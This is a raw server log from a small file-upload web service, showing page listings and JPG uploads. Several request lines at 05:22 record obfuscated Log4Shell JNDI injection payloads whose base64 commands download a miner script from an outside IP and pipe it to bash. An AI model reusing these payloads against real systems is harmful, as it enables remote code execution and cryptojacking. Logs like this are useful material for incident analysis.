[22:04:52][140703571493376[INFO][asynclogger][DataManager.hpp:50]	DataManager construct start
[22:05:41][140703489504832[INFO][asynclogger][DataManager.hpp:96]	message storage start
[22:05:41][140703489504832[INFO][asynclogger][DataManager.hpp:118]	new message for StorageInfo:
[22:05:41][140703489504832[INFO][asynclogger][DataManager.hpp:127]	message storage end
[22:05:41][140703489504832[INFO][asynclogger][DataManager.hpp:142]	data_message Insert end
[22:05:41][140703489504832[INFO][asynclogger][Service.hpp:215]	upload finish:success
[22:05:43][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /
[22:05:43][140703489504832[INFO][asynclogger][Service.hpp:326]	ListShow()
[22:05:43][140703489504832[INFO][asynclogger][Service.hpp:353]	ListShow() finish
[22:07:27][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /
[22:07:27][140703489504832[INFO][asynclogger][Service.hpp:326]	ListShow()
[22:07:27][140703489504832[INFO][asynclogger][Service.hpp:353]	ListShow() finish
[22:09:41][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /
[22:09:41][140703489504832[INFO][asynclogger][Service.hpp:326]	ListShow()
[22:09:41][140703489504832[INFO][asynclogger][Service.hpp:353]	ListShow() finish
[00:57:21][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /
[00:57:21][140703489504832[INFO][asynclogger][Service.hpp:326]	ListShow()
[00:57:21][140703489504832[INFO][asynclogger][Service.hpp:353]	ListShow() finish
[01:02:02][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /
[01:02:02][140703489504832[INFO][asynclogger][Service.hpp:326]	ListShow()
[01:02:02][140703489504832[INFO][asynclogger][Service.hpp:353]	ListShow() finish
[01:02:03][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /
[01:02:03][140703489504832[INFO][asynclogger][Service.hpp:326]	ListShow()
[01:02:03][140703489504832[INFO][asynclogger][Service.hpp:353]	ListShow() finish
[01:02:03][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /favicon.ico
[01:02:03][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /robots.txt
[01:52:45][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /
[01:52:45][140703489504832[INFO][asynclogger][Service.hpp:326]	ListShow()
[01:52:45][140703489504832[INFO][asynclogger][Service.hpp:353]	ListShow() finish
[02:03:09][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /
[02:03:09][140703489504832[INFO][asynclogger][Service.hpp:326]	ListShow()
[02:03:09][140703489504832[INFO][asynclogger][Service.hpp:353]	ListShow() finish
[02:03:26][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /
[02:03:26][140703489504832[INFO][asynclogger][Service.hpp:326]	ListShow()
[02:03:26][140703489504832[INFO][asynclogger][Service.hpp:353]	ListShow() finish
[02:03:27][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /
[02:03:27][140703489504832[INFO][asynclogger][Service.hpp:326]	ListShow()
[02:03:27][140703489504832[INFO][asynclogger][Service.hpp:353]	ListShow() finish
[02:03:49][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /
[02:03:49][140703489504832[INFO][asynclogger][Service.hpp:326]	ListShow()
[02:03:49][140703489504832[INFO][asynclogger][Service.hpp:353]	ListShow() finish
[05:07:37][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /
[05:07:37][140703489504832[INFO][asynclogger][Service.hpp:326]	ListShow()
[05:07:37][140703489504832[INFO][asynclogger][Service.hpp:353]	ListShow() finish
[05:22:22][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.15.16.252:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwOi8vMzEuMTUuMTYuMjUyL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzMxLjE1LjE2LjI1Mi9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==}')
[05:22:23][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /${${upper::-j}${upper::-n}${::-d}${upper::-i}:${upper::-l}${upper::-d}${upper::-a}${upper::-p}://31.15.16.252:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwOi8vMzEuMTUuMTYuMjUyL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzMxLjE1LjE2LjI1Mi9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==}
[05:22:23][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://31.15.16.252:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwOi8vMzEuMTUuMTYuMjUyL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzMxLjE1LjE2LjI1Mi9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==}
[05:22:23][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://31.15.16.252:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwOi8vMzEuMTUuMTYuMjUyL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzMxLjE1LjE2LjI1Mi9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==
[09:06:29][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /
[09:06:29][140703489504832[INFO][asynclogger][Service.hpp:326]	ListShow()
[09:06:30][140703489504832[INFO][asynclogger][Service.hpp:353]	ListShow() finish
[09:06:38][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /
[09:06:38][140703489504832[INFO][asynclogger][Service.hpp:326]	ListShow()
[09:06:38][140703489504832[INFO][asynclogger][Service.hpp:353]	ListShow() finish
[09:06:52][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /favicon.ico
[09:07:25][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /robots.txt
[09:07:25][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /favicon.ico
[09:40:16][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /
[09:40:16][140703489504832[INFO][asynclogger][Service.hpp:326]	ListShow()
[09:40:16][140703489504832[INFO][asynclogger][Service.hpp:353]	ListShow() finish
[09:41:43][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /upload
[09:41:43][140703489504832[INFO][asynclogger][Service.hpp:119]	Upload start
[09:41:43][140703489504832[INFO][asynclogger][Service.hpp:131]	evbuffer_get_length is 8279285
[09:41:43][140703489504832[DEBUG][asynclogger][Service.hpp:177]	storage_path:./low_storage/闪电1.jpg
[09:41:44][140703489504832[INFO][asynclogger][Service.hpp:192]	low_storage success
[09:41:44][140703489504832[INFO][asynclogger][DataManager.hpp:18]	NewStorageInfo start
[09:41:44][140703489504832[INFO][asynclogger][DataManager.hpp:33]	download_url:/download/闪电1.jpg,mtime_:Thu Sep 11 09:41:43 2025
,atime_:Thu Sep 11 09:41:43 2025
,fsize_:8279285
[09:41:44][140703489504832[INFO][asynclogger][DataManager.hpp:34]	NewStorageInfo end
[09:41:44][140703489504832[INFO][asynclogger][DataManager.hpp:133]	data_message Insert start
[09:41:44][140703489504832[INFO][asynclogger][DataManager.hpp:96]	message storage start
[09:41:44][140703489504832[INFO][asynclogger][DataManager.hpp:118]	new message for StorageInfo:
[09:41:44][140703489504832[INFO][asynclogger][DataManager.hpp:127]	message storage end
[09:41:44][140703489504832[INFO][asynclogger][DataManager.hpp:142]	data_message Insert end
[09:41:44][140703489504832[INFO][asynclogger][Service.hpp:215]	upload finish:success
[09:41:45][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /
[09:41:45][140703489504832[INFO][asynclogger][Service.hpp:326]	ListShow()
[09:41:45][140703489504832[INFO][asynclogger][Service.hpp:353]	ListShow() finish
[09:41:51][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /upload
[09:41:51][140703489504832[INFO][asynclogger][Service.hpp:119]	Upload start
[09:41:51][140703489504832[INFO][asynclogger][Service.hpp:131]	evbuffer_get_length is 8671309
[09:41:51][140703489504832[DEBUG][asynclogger][Service.hpp:177]	storage_path:./low_storage/闪电2.jpg
[09:41:51][140703489504832[INFO][asynclogger][Service.hpp:192]	low_storage success
[09:41:51][140703489504832[INFO][asynclogger][DataManager.hpp:18]	NewStorageInfo start
[09:41:51][140703489504832[INFO][asynclogger][DataManager.hpp:33]	download_url:/download/闪电2.jpg,mtime_:Thu Sep 11 09:41:51 2025
,atime_:Thu Sep 11 09:41:51 2025
,fsize_:8671309
[09:41:51][140703489504832[INFO][asynclogger][DataManager.hpp:34]	NewStorageInfo end
[09:41:51][140703489504832[INFO][asynclogger][DataManager.hpp:133]	data_message Insert start
[09:41:51][140703489504832[INFO][asynclogger][DataManager.hpp:96]	message storage start
[09:41:51][140703489504832[INFO][asynclogger][DataManager.hpp:118]	new message for StorageInfo:
[09:41:51][140703489504832[INFO][asynclogger][DataManager.hpp:127]	message storage end
[09:41:51][140703489504832[INFO][asynclogger][DataManager.hpp:142]	data_message Insert end
[09:41:51][140703489504832[INFO][asynclogger][Service.hpp:215]	upload finish:success
[09:41:53][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /
[09:41:53][140703489504832[INFO][asynclogger][Service.hpp:326]	ListShow()
[09:41:53][140703489504832[INFO][asynclogger][Service.hpp:353]	ListShow() finish
[09:42:03][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /upload
[09:42:03][140703489504832[INFO][asynclogger][Service.hpp:119]	Upload start
[09:42:03][140703489504832[INFO][asynclogger][Service.hpp:131]	evbuffer_get_length is 97449
[09:42:03][140703489504832[DEBUG][asynclogger][Service.hpp:177]	storage_path:./low_storage/证件照.JPG
[09:42:03][140703489504832[INFO][asynclogger][Service.hpp:192]	low_storage success
[09:42:03][140703489504832[INFO][asynclogger][DataManager.hpp:18]	NewStorageInfo start
[09:42:03][140703489504832[INFO][asynclogger][DataManager.hpp:33]	download_url:/download/证件照.JPG,mtime_:Thu Sep 11 09:42:03 2025
,atime_:Thu Sep 11 09:42:03 2025
,fsize_:97449
[09:42:03][140703489504832[INFO][asynclogger][DataManager.hpp:34]	NewStorageInfo end
[09:42:03][140703489504832[INFO][asynclogger][DataManager.hpp:133]	data_message Insert start
[09:42:03][140703489504832[INFO][asynclogger][DataManager.hpp:96]	message storage start
[09:42:03][140703489504832[INFO][asynclogger][DataManager.hpp:118]	new message for StorageInfo:
[09:42:03][140703489504832[INFO][asynclogger][DataManager.hpp:127]	message storage end
[09:42:03][140703489504832[INFO][asynclogger][DataManager.hpp:142]	data_message Insert end
[09:42:03][140703489504832[INFO][asynclogger][Service.hpp:215]	upload finish:success
[09:42:04][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /
[09:42:04][140703489504832[INFO][asynclogger][Service.hpp:326]	ListShow()
[09:42:04][140703489504832[INFO][asynclogger][Service.hpp:353]	ListShow() finish
[09:53:20][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /upload
[09:53:20][140703489504832[INFO][asynclogger][Service.hpp:119]	Upload start
[09:53:20][140703489504832[INFO][asynclogger][Service.hpp:131]	evbuffer_get_length is 0
[09:53:20][140703489504832[INFO][asynclogger][Service.hpp:135]	request body is empty
[10:21:26][140703489504832[INFO][asynclogger][Service.hpp:88]	get req, uri: /
[10:21:28][140703489504832[INFO][asynclogger][Service.hpp:326]	ListShow()
[10:21:54][140703489504832[INFO][asynclogger][Service.hpp:353]	ListShow() finish
